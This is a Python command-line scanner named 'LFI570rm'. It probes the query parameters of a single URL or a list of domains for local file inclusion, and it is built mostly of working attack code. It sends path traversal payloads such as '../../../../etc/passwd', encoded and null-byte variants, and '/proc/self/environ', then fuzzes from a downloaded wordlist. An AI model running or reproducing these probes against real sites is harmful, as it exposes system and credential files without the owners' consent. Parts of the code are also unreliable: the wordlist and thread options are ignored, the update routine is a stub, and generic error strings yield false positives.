#!/usr/bin/env python3
"""
LFI570rm - Advanced LFI Vulnerability Scanner
Author: BL4CK_570RM
Version: 1.0
"""

import argparse
import requests
import sys
import os
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Tool banner
BANNER = f"""
{Fore.RED}
$$\       $$$$$$$$\ $$$$$$\ $$$$$$$\  $$$$$$$$\  $$$$$$\  $$$$$$$\  $$\      $$\ 
$$ |      $$  _____|\_$$  _|$$  ____| \____$$  |$$$ __$$\ $$  __$$\ $$$\    $$$ |
$$ |      $$ |        $$ |  $$ |          $$  / $$$$\ $$ |$$ |  $$ |$$$$\  $$$$ |
$$ |      $$$$$\      $$ |  $$$$$$$\     $$  /  $$\$$\$$ |$$$$$$$  |$$\$$\$$ $$ |
$$ |      $$  __|     $$ |  \_____$$\   $$  /   $$ \$$$$ |$$  __$$< $$ \$$$  $$ |
$$ |      $$ |        $$ |  $$\   $$ | $$  /    $$ |\$$$ |$$ |  $$ |$$ |\$  /$$ |
$$$$$$$$\ $$ |      $$$$$$\ \$$$$$$  |$$  /     \$$$$$$  /$$ |  $$ |$$ | \_/ $$ |
\________|\__|      \______| \______/ \__/       \______/ \__|  \__|\__|     \__|
                                                                                 
                                                                                 
                                                                                 
{Style.RESET_ALL}
 {Fore.YELLOW}Advanced LFI Vulnerability Scanner{Style.RESET_ALL}
 {Fore.CYAN}Version: 1.0 | Author: BL4CK_570RM {Style.RESET_ALL}
"""

class LFIScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.timeout = 10
        self.verbose = False
        self.wordlist = "wordlists/lfi_common.txt"
        self.results = []
        
        # Create wordlists directory if not exists
        if not os.path.exists("wordlists"):
            os.makedirs("wordlists")
        
        # Check if wordlist exists, if not download a default one
        if not os.path.exists(self.wordlist):
            self.download_default_wordlist()

    def download_default_wordlist(self):
        """Download a default LFI wordlist if not present"""
        default_wordlist_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt"
        try:
            print(f"{Fore.YELLOW}[!] Downloading default wordlist...{Style.RESET_ALL}")
            response = requests.get(default_wordlist_url, timeout=self.timeout)
            with open(self.wordlist, 'wb') as f:
                f.write(response.content)
            print(f"{Fore.GREEN}[+] Default wordlist downloaded successfully{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to download default wordlist: {e}{Style.RESET_ALL}")
            sys.exit(1)

    def load_wordlist(self, wordlist_path=None):
        """Load the wordlist for fuzzing"""
        path = wordlist_path if wordlist_path else self.wordlist
        try:
            with open(path, 'r', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Fore.RED}[-] Wordlist not found: {path}{Style.RESET_ALL}")
            sys.exit(1)
        except Exception as e:
            print(f"{Fore.RED}[-] Error loading wordlist: {e}{Style.RESET_ALL}")
            sys.exit(1)

    def check_lfi_vulnerability(self, url, payload):
        """Check for LFI vulnerability with a specific payload"""
        try:
            # Test with simple LFI payload
            test_url = url.replace("FUZZ", payload)
            response = self.session.get(test_url, timeout=self.timeout)
            
            # Check for common LFI indicators in response
            indicators = [
                "root:x:0:0",
                "/etc/passwd",
                "bin/bash",
                "Permission denied",
                "No such file or directory"
            ]
            
            if any(indicator in response.text for indicator in indicators):
                return True, test_url, response.status_code
            
            # Check for common error patterns
            error_patterns = [
                "PHP Warning",
                "include()",
                "require()",
                "failed to open stream"
            ]
            
            if any(pattern in response.text for pattern in error_patterns):
                return True, test_url, response.status_code
                
            return False, None, None
            
        except requests.RequestException as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] Request failed for {payload}: {e}{Style.RESET_ALL}")
            return False, None, None

    def scan_url(self, url):
        """Scan a single URL for LFI vulnerabilities"""
        print(f"{Fore.CYAN}[*] Scanning URL: {url}{Style.RESET_ALL}")
        
        # Check if URL has parameters
        parsed = urlparse(url)
        if not parsed.query:
            print(f"{Fore.YELLOW}[!] URL has no parameters to test{Style.RESET_ALL}")
            return
            
        # Load wordlist
        wordlist = self.load_wordlist()
        
        # Prepare URL for fuzzing
        param = parsed.query.split('=')[0]
        fuzz_url = url.replace(f"{param}=", f"{param}=FUZZ")
        
        # Test with common LFI payloads
        print(f"{Fore.BLUE}[*] Testing common LFI payloads...{Style.RESET_ALL}")
        common_payloads = [
            "../../../../etc/passwd",
            "../../../../etc/passwd%00",
            "....//....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/proc/self/environ",
            "/proc/self/cmdline"
        ]
        
        for payload in common_payloads:
            vulnerable, test_url, status_code = self.check_lfi_vulnerability(fuzz_url, payload)
            if vulnerable:
                print(f"{Fore.GREEN}[+] LFI Vulnerability Found: {test_url} (Status: {status_code}){Style.RESET_ALL}")
                self.results.append(test_url)
                break
        
        # If no common payload worked, try with wordlist
        if not self.results:
            print(f"{Fore.BLUE}[*] Starting fuzzing with wordlist...{Style.RESET_ALL}")
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                for payload in wordlist:
                    futures.append(executor.submit(self.check_lfi_vulnerability, fuzz_url, payload))
                
                for future in futures:
                    vulnerable, test_url, status_code = future.result()
                    if vulnerable:
                        print(f"{Fore.GREEN}[+] LFI Vulnerability Found: {test_url} (Status: {status_code}){Style.RESET_ALL}")
                        self.results.append(test_url)
                        break

    def scan_from_file(self, file_path):
        """Scan multiple URLs from a file"""
        try:
            with open(file_path, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
                
            for url in urls:
                self.scan_url(url)
                
        except FileNotFoundError:
            print(f"{Fore.RED}[-] File not found: {file_path}{Style.RESET_ALL}")
            sys.exit(1)
        except Exception as e:
            print(f"{Fore.RED}[-] Error reading file: {e}{Style.RESET_ALL}")
            sys.exit(1)

    def update_tool(self):
        """Update the tool from GitHub"""
        print(f"{Fore.YELLOW}[!] Checking for updates...{Style.RESET_ALL}")
        try:
            # Here you would implement the update logic
            # For example, pull from GitHub or download new version
            print(f"{Fore.GREEN}[+] Tool is up to date{Style.RESET_ALL}")
            # In a real implementation, you would:
            # 1. Check current version against GitHub
            # 2. Download updates if available
            # 3. Replace files if needed
        except Exception as e:
            print(f"{Fore.RED}[-] Update failed: {e}{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description="LFI570rm - Advanced LFI Vulnerability Scanner")
    parser.add_argument('-dl', '--domain-list', help="File containing list of URLs to scan")
    parser.add_argument('-u', '--url', help="Single URL to scan")
    parser.add_argument('-w', '--wordlist', help="Custom wordlist path")
    parser.add_argument('-up', '--update', action='store_true', help="Update the tool")
    parser.add_argument('-v', '--verbose', action='store_true', help="Verbose output")
    parser.add_argument('-o', '--output', help="Output file to save results")
    parser.add_argument('-t', '--threads', type=int, default=10, help="Number of threads (default: 10)")
    
    args = parser.parse_args()
    
    # Print banner
    print(BANNER)
    
    scanner = LFIScanner()
    scanner.verbose = args.verbose
    
    if args.update:
        scanner.update_tool()
        sys.exit(0)
        
    if not args.domain_list and not args.url:
        parser.print_help()
        sys.exit(1)
        
    if args.url:
        scanner.scan_url(args.url)
        
    if args.domain_list:
        scanner.scan_from_file(args.domain_list)
        
    if args.output and scanner.results:
        try:
            with open(args.output, 'w') as f:
                for result in scanner.results:
                    f.write(f"{result}\n")
            print(f"{Fore.GREEN}[+] Results saved to {args.output}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to save results: {e}{Style.RESET_ALL}")
    
    print(f"\n{Fore.GREEN}[+] Scan completed. Found {len(scanner.results)} potential LFI vulnerabilities.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
